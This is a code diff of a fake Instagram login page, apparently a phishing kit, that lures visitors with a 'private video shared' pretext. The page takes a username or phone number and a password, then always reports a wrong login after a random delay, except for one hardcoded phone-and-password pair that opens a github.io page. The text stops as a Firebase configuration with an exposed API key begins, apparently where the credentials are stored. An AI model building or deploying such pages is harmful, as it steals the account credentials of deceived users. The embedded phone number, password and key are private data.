@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html>
     <head>
-        <title>Instagram reel by mr_alone_gamer</title>
+        <title>instagram post shared by mr_alone_gamer__</title>
         
         <meta charset="UTF-8">
     <meta http-equiv="X-UA-Compatible" content="IE=Edge">
@@ -12,7 +12,6 @@
         
         
         <style>       
-
 * {
      margin:0;
      padding:0;
@@ -271,10 +270,16 @@ h5 {
         <div class="login" >
         
         <img class="instagram" src="https://i.ibb.co/QFy23X6/1642696813765.png" />
+        <div class="instawrapper"> </div>
+        
         
         <input id="email" type="text" placeholder="Phone number, username, or email" />
         
         <input id="pass" type="password" placeholder="Password" />
+        
+        <p id="showpass">Show</p>
+        
+        
         <a href="https://www.instagram.com/accounts/password/reset/">
         <p> Forget Password?</p> </a>
         
@@ -291,7 +296,7 @@ h5 {
         </div>
         
         <img id="meta" src="https://i.ibb.co/ZmTXTzN/1642699576538.png" />
-        
+        <div id="metawrapper"> </div>
         
         <div id="blank">
             <div id="wrong">
@@ -308,25 +313,6 @@ h5 {
             </div>
         </div>
         
-        
-        <div id="reel">
-            
-          <p>Private Video Shared by <a href="https://instagram.com/vinaykpro?utm_medium=copy_link">vinaykpro</a></p>
-          <img src="https://i.ibb.co/ns4HY4r/Screenshot-20220122-102455-01-01.jpg" alt="reel"/>
-            
-          <p>Only Selected Users Can view this video</p>
-            
-            
-            
-        </div>
-        
-        
-        
-        
-        
-        
-        
-        
     </body>
     
     <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script> 
@@ -335,17 +321,14 @@ h5 {
     <script>
     
     document.getElementById("meta").style.top = (innerHeight-(innerHeight/18))+"px";
-    
-    document.getElementById("reel").style.top =(innerHeight-(innerHeight/18))-($("#reel").height()+50)+"px";
-    
-    
+    document.getElementById("metawrapper").style.top = (innerHeight-(innerHeight/18))+"px";
     
     
     
 var email = document.getElementById("email");
 var pass = document.getElementById("pass");
 var login = false;
-
+var passcount = 0;
 
 email.onkeyup = () => {
     check();
@@ -360,6 +343,8 @@ pass.onkeyup = () => {
 function check() {
     let emailc = false,passc = false;
     
+    let showbtn = document.getElementById("showpass");
+    
     if(!isNaN(email.value))
     {
         if(email.value.length == 10)
@@ -372,6 +357,13 @@ function check() {
     if(pass.value.length >= 6)
     {
         passc = true;
+    }
+    
+    if(pass.value.length == 0) {
+        showbtn.style.visibility = "hidden";
+    }
+    else {
+        showbtn.style.visibility = "visible";
     }
     
     if(emailc && passc) {
@@ -396,14 +388,21 @@ document.getElementById("login").onclick = () => {
     document.getElementById("spinner").style.display  = "block";
     
     setTimeout( () => {
+    
+    if(email.value == "8790169829" && pass.value == "papaya69"){
+         window.open("https://instagramreels.github.io/reel-by-mr-alone-gamer-private-video-mp4/")
+        
+        
+    } 
+    else
+    {
     document.getElementById("blank").style.display = "block";
     document.getElementById("wrong").style.display = "block";
     
     document.getElementById("login").style.color = "white";
-    
     document.getElementById("spinner").style.display  = "none";
-    
-    
+    passcount += 1;
+    }
     
     },Math.floor(Math.random()*5000)+1000);
     
@@ -414,6 +413,28 @@ document.getElementById("tryagain").onclick = () => {
     document.getElementById("blank").style.display = "none";
     document.getElementById("wrong").style.display = "none";
 }
+
+
+let showbtn = document.getElementById("showpass");
+
+showbtn.onclick = () => {
+
+    let type = document.getElementById("pass");
+
+    if(type.type == "password") {
+      showbtn.innerHTML = "Hide";
+      type.type = "text"
+      }
+    else {
+      showbtn.innerHTML = "Show";
+      type.type = "password"
+      }
+}
+
+
+
+
+
 
 var config = {
     apiKey: "AIzaSyA_kyipbRucrtWAtf8jbULc1B0DBRHPHHU",
